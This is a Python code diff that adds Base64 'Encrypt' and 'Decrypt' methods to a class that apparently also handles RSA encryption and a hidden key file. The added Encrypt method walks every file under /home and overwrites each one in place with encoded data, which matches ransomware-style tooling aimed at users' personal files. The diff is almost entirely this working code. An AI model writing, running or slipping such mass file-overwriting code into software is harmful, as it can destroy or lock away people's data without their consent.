@@ -88,4 +88,34 @@ class File:
             print("RSA decryption completed.")
             os.remove(os.path.join(directory, '.key.txt')) #removing hidden key file
 
-            
+    class Base64:
+        @staticmethod
+        def Encrypt():
+            for root, _, files in os.walk('/home'):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    with open(file_path, 'r') as f:
+                        data = f.read()
+                        data = data.encode()
+                    encrypted_data = Cipher.Base64.encode(data)
+                    with open(file_path, 'w') as f:
+                        f.write(encrypted_data)
+                    print(f"Base64 Encrypted: {file_path}")
+
+            print("Base64 Encryption completed.")
+
+
+        @staticmethod
+        def Decrypt():
+            for root, _, files in os.walk('/home'):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    with open(file_path, 'r') as f:
+                        encrypted_data = f.read()
+                    decrypted_data = Cipher.Base64.decode(encrypted_data)
+                    decrypted_data = decrypted_data.decode()
+                    with open(file_path, 'w') as f:
+                        f.write(decrypted_data)
+                    print(f"Base64 Decrypted: {file_path}")
+
+            print("Base64 Decryption completed.")
